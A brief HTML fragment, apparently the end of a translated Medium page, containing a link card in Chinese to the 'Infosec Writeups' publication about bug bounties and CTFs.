gr or os"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="ot ab fo"><div class="ou ab ov cl cj ow"><h2 class="bd ir gy z fp ox fr fs oy fu fw ip bi translated">信息安全报道</h2><div class="oz l"><h3 class="bd b gy z fp ox fr fs oy fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="pa l"><p class="bd b dl z fp ox fr fs oy fu fw dk translated">medium.com</p></div></div><div class="pb l"><div class="pt l pd pe pf pb pg js os"/></div></div></a></div></div></div>    
</body>
</html>